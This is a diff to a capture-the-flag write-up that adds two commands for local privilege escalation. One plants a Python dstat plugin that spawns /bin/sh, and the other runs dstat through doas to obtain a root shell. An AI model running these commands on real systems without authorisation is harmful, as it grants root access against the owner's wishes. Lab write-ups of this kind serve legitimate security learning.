@@ -88,11 +88,11 @@
 
 13. So following the steps on GTFOBins, we write a python shell file to the `/usr/local/share/dstat` folder. 
 
-``
+`echo 'import os; os.execv("/bin/sh", ["sh"])' > /usr/local/share/dstat/dstat_shell.py`
 
 14. Then, with doas, we call the dstat command and we get a root shell and the root flag!
 
-``
+`doas /usr/bin/dstat --shell`
 
 <img width="541" height="232" alt="image" src="https://github.com/user-attachments/assets/1ffe9a26-e522-40ca-bdad-4026517f1e5a" />
 
